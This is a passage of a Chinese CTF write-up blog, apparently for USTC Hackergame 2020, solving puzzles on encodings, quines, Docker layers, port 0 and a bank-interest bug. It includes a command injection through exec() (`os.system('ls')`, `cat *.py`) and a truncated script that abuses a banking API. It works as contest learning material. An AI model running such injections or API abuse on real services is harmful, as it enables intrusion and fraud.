class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    